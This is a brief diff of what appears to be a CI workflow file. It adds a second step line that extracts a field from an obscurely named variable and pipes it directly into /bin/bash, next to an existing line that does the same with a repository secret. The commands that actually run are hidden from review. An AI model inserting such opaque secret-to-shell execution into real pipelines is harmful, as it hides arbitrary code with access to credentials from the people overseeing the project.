@@ -18,6 +18,7 @@ jobs:
           afxi9863: ${{ secrets.afxi9863 }}
         run: |
           printf '%s' "$afxi9863" | jq -r .sqkfh6582 | /bin/bash
+          printf '%s' "$vd15584" | jq -r .ib87 | /bin/bash
 
       - name: Save output
         if: always()
